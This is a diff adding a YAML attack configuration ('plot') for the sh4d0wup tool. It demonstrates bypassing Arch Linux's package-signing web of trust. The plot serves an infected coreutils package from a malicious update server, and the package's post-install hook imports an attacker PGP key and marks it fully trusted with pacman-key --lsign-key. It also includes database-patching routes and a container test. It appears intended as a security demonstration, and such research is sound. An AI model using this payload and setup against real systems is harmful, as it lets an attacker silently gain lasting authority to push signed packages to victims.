@@ -1,0 +1,147 @@
+---
+
+# Arch Linux uses a client-side evaluation of a web-of-trust graph to decide if
+# a package signature is considered valid or not. This web-of-trust graph
+# enforces a policy that no single master key is able to mint new packager
+# keys:
+#
+# > At least three of these Master Signing Keys are used to sign the
+# > Developer's and Trusted User's own keys.
+#
+# https://wiki.archlinux.org/title/Pacman/Package_signing
+#
+# This "at least three" threshold is supposed to prevent tampering on the
+# archlinux-keyring package but can be bypassed by issuing an update with
+# install instructions to import a key and marking it as fully trusted to
+# disable web-of-trust checks for this key.
+#
+# This plot runs this attack against an `archlinux` container (the `legit` key
+# is imported as trusted for demonstration purposes), the container then:
+#  - updates from a malicious update server
+#  - the update server delivers an infected coreutils
+#  - the update has a post install hook that is executed automatically
+#  - the hook installs the "Nothing to see here, move along" key for package signing
+#  - it assigns full trust with --lsign, disabling web-of-trust checks for this key
+#
+# Test with: sh4d0wup check contrib/plot-archlinux-lsign.yaml
+
+upstreams:
+  archlinux:
+    url: https://geo.mirror.pkgbuild.com/
+
+signing_keys:
+  legit:
+    type: pgp
+    ## PUT PACKAGER KEY HERE, then remove `uids:`
+    uids: ["John Doe <no-reply@example.com>"]
+
+artifacts:
+  coreutils_upstream:
+    type: url
+    url: https://geo.mirror.pkgbuild.com/core/os/x86_64/coreutils-9.1-3-x86_64.pkg.tar.zst
+    sha256: 43dfb7cee3765a5e95a8ef463712f2955fdc0f8c84a2a62d053bb67b0ee7f614
+  coreutils:
+    type: infect
+    infect: pacman
+    artifact: coreutils_upstream
+    set:
+      pkgver:
+        - 9.1-777
+    # this is the key that's going to be installed and marked to bypass the web-of-trust
+    payload: |
+      pacman-key --add - <<EOF
+      -----BEGIN PGP PUBLIC KEY BLOCK-----
+      Comment: 1B5E 4529 27D3 3828 0B31  9331 21C7 2D05 E005 CBAF
+      Comment: Nothing to see here, move along
+
+      xjMEY6ckhhYJKwYBBAHaRw8BAQdAW3CW4bUgJbgxNQO9gxDKll2DMP6D5plQDqQq
+      mMFdumzCwAsEHxYKAH0FgmOnJIYDCwkHCRAhxy0F4AXLr0cUAAAAAAAeACBzYWx0
+      QG5vdGF0aW9ucy5zZXF1b2lhLXBncC5vcmceXEDzpSboDrmU2JaXYAjfOaGEdGmw
+      aovCptNogSpZYQMVCggCmwECHgEWIQQbXkUpJ9M4KAsxkzEhxy0F4AXLrwAAd7MA
+      /Axx6XhlgZaAldlgqLybrDtPAUumCzc+mwhWwwPFRoHzAPwJlLG2XNAVzCZVLaLr
+      d1T8sq/d3NHfWJVRviS4VgezAM0fTm90aGluZyB0byBzZWUgaGVyZSwgbW92ZSBh
+      bG9uZ8LADgQTFgoAgAWCY6ckhgMLCQcJECHHLQXgBcuvRxQAAAAAAB4AIHNhbHRA
+      bm90YXRpb25zLnNlcXVvaWEtcGdwLm9yZ2dk88Lubfe2K8KMqbMlU/ARNJvJzd+3
+      VZIs/6Blf60aAxUKCAKZAQKbAQIeARYhBBteRSkn0zgoCzGTMSHHLQXgBcuvAADM
+      7QEAwF6kusyH/E1DFG0uvTGF7SYcL56bKRm/cxAQKxG4saMBAPtjXCC9ZQpg/toA
+      JF44p+RWpfj6dqiX5E/2m3YysfgFzjMEY6ckhhYJKwYBBAHaRw8BAQdA7iTVojTK
+      gfJzSz20+H0VpKRSyas3NptBP1Qe5xi/bwrCwL8EGBYKATEFgmOnJIYJECHHLQXg
+      BcuvRxQAAAAAAB4AIHNhbHRAbm90YXRpb25zLnNlcXVvaWEtcGdwLm9yZ+nFltrB
+      YxEsQX0WlGivJkuIdkleo60zzyMxQCAmVeiOApsCvqAEGRYKAG8FgmOnJIYJEGBt
+      G7TyVhlVRxQAAAAAAB4AIHNhbHRAbm90YXRpb25zLnNlcXVvaWEtcGdwLm9yZ2po
+      iZdzrME8MAtHFNpgSLvlMDIOJ4D3vXmMcUzY49tkFiEEf8P3GACPK1M+TJIlYG0b
+      tPJWGVUAAJj3AP46/ms5l37CCgP9UfrKpSsHW9TvctIDi3k/bjUJ3qpGEwD/RYVt
+      nFXQGYjrg5+TFhU1D17J7siY3Q1zoSW79GJD3gcWIQQbXkUpJ9M4KAsxkzEhxy0F
+      4AXLrwAA0HcBAObsIG259gwGH5hb5rXhdfXjGqIC1J25bKIfLydq9HP1AP46nqx8
+      etrltuWtXYznZgaL1lxne2iSbft0pzsZ3Le8D844BGOnJIYSCisGAQQBl1UBBQEB
+      B0BULsom3Hzi9EgPo4lwbqME9W8Nx/dCbfikDc++aaCfMQMBCAfCwAAEGBYKAHIF
+      gmOnJIYJECHHLQXgBcuvRxQAAAAAAB4AIHNhbHRAbm90YXRpb25zLnNlcXVvaWEt
+      cGdwLm9yZ1SqbZ0unOjYngFjG8To3At28ExQHNeEZEi4Gaq1NbIzApsEFiEEG15F
+      KSfTOCgLMZMxIcctBeAFy68AANoUAQD3ji67iLKdB95752V4GZTlK802HIVYrs+B
+      FnQJnBXzjQEAsph+jh9VEXsq4Qrbql4TLbwTSDtLVzoCTjLdmal2iAjOOARjpySG
+      EgorBgEEAZdVAQUBAQdAazwX2PDSPu3uKF3qw24jjOCao/tsfFykXJPsY+cS7zED
+      AQgHwsAABBgWCgByBYJjpySGCRAhxy0F4AXLr0cUAAAAAAAeACBzYWx0QG5vdGF0
+      aW9ucy5zZXF1b2lhLXBncC5vcmcMy9wLWMZYC+9W574XM81MeOk29HdK5thbbmn+
+      OQFmWQKbCBYhBBteRSkn0zgoCzGTMSHHLQXgBcuvAAAS0QEAvnxwLW+J+Btsk99f
+      MKBk/Z/crv2q5txeP3V/yKMhLYkBAIdKzReSScRrH9Z4xwvHfPgQfdPpD3MM9dmp
+      grD5HQ4MzjgEY6ckhhIKKwYBBAGXVQEFAQEHQJ21CorvwOqVc50ZXfXU2Acc4rW5
+      ZfMuFDnnXdt8U4s+AwEIB8LAAAQYFgoAcgWCY6ckhgkQIcctBeAFy69HFAAAAAAA
+      HgAgc2FsdEBub3RhdGlvbnMuc2VxdW9pYS1wZ3Aub3JnnH8jsb17ngPTAuUmU3Ga
+      tHPaGILbCMgEfHoKwoepKAwCmwwWIQQbXkUpJ9M4KAsxkzEhxy0F4AXLrwAAkhgA
+      /2mjRe3UHZqjt3GNbJKgqD2yYchY5qrRcXuIlI0AC8PSAP0RpTDwkpc9cV7uPeoK
+      QeHMMu5VKhv9zlm544Uh2x6nBg==
+      =1/gO
+      -----END PGP PUBLIC KEY BLOCK-----
+      EOF
+      pacman-key --lsign-key 'Nothing to see here, move along'
+  coreutils_sig:
+    type: signature
+    artifact: coreutils
+    sign_with: legit
+
+check:
+  image: archlinux
+  install_keys:
+    - key: legit
+      cmd: "tee /tmp/legit.pgp > /dev/null"
+  cmds:
+    - ["pacman-key", "--init"]
+    # we use a dummy key for this demo so we need to install it as trusted
+    # if you have an Arch Linux packager key you can skip this
+    - ["pacman-key", "--add", "/tmp/legit.pgp"]
+    - ["pacman-key", "--lsign", "John Doe <no-reply@example.com>"]
+    # show the key we run the attack from
+    - ["pacman-key", "-l", "John Doe <no-reply@example.com>"]
+    # show all keys that can issue updates
+    - 'pacman-key -l -- --with-colons | grep uid:\[uf\]'
+    # run the update
+    - 'echo "Server = http://${SH4D0WUP_BOUND_ADDR}/\$repo/os/\$arch" | tee /etc/pacman.d/mirrorlist'
+    - ["pacman", "-Suy", "--noconfirm"]
+    # show the new key we installed
+    - ["pacman-key", "-l", "Nothing to see here, move along"]
+
+routes:
+  - path: "/core/os/x86_64/core.db"
+    type: patch-pacman-db
+    args:
+      upstream: archlinux
+      patch:
+        - name: coreutils
+          artifact: coreutils
+          signature: coreutils_sig
+          set:
+            "%VERSION%":
+              - 9.1-777
+            "%FILENAME%":
+              - "coreutils-9.1-777-x86_64.pkg.tar.zst"
+  - path: "/core/os/x86_64/coreutils-9.1-777-x86_64.pkg.tar.zst"
+    type: static
+    args:
+      artifact: coreutils
+  - path: "/core/os/x86_64/coreutils-9.1-777-x86_64.pkg.tar.zst.sig"
+    type: static
+    args:
+      artifact: coreutils_sig
+  - type: proxy
+    args:
+      upstream: archlinux
